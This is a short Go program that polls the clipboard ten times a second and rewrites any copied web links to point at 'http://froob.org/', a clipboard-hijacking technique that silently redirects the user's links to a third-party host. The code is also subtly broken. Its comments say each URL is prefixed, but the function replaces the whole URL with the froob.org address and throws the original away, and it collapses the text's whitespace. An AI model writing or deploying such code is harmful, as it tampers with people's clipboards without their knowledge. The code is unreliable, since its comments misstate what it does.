package main

import (
	"log"
	"strings"
	"time"

	"github.com/f1bonacc1/glippy"
)

func main() {
	// Set up a ticker that ticks every 100 milliseconds.
	tick := time.Tick(100 * time.Millisecond)
	// Start an infinite loop, calling clipboardCheck on each iteration.
	for range tick {
		clipboardCheck()
	}
}

func clipboardCheck() {
	text, err := glippy.Get()
	if err != nil {
		// Log if there was an error getting the clipboard text.
		log.Println(err)
	}

	// If the text does not contain "http" or contains "http://froob.org/" already, return.
	if !containsHTTP(text) || containsFroobURL(text) {
		return
	}

	modifiedText := modifyText(text)
	glippy.Set(modifiedText)
}

// containsHTTP returns true if the given text contains the string "http", false otherwise.
func containsHTTP(text string) bool {
	return strings.Contains(text, "http")
}

// containsFroobURL returns true if the given text contains the string "http://froob.org/", false otherwise.
func containsFroobURL(text string) bool {
	return strings.Contains(text, "http://froob.org/")
}

// modifyText returns a modified version of the given text in which each word that starts with "https://" or "http://"
// is prepended with "http://froob.org/".
func modifyText(text string) string {
	// Initialize a new strings.Builder object.
	var newCopy strings.Builder
	// Split the text into words.
	words := strings.Fields(text)
	// Iterate over the words.
	for i, s := range words {
		// If it is the first word:
		if i == 0 {
			newCopy.WriteString(froob(s))
		} else {
			// If it is not the first word:
			newCopy.WriteString(" " + froob(s))
		}
	}
	return newCopy.String()
}

// prependFroob returns the given word with "http://froob.org/" prepended to it if the word starts with "https://" or "http://".
// Otherwise, it returns the word as is.
func froob(word string) string {
	// Check if the word starts with "https://" or "http://".
	// If it does, return "http://froob.org/" + the word.
	// If not, return the word as is.
	if strings.HasPrefix(word, "https://") || strings.HasPrefix(word, "http://") {
		return "http://froob.org/"
	}
	return word
}
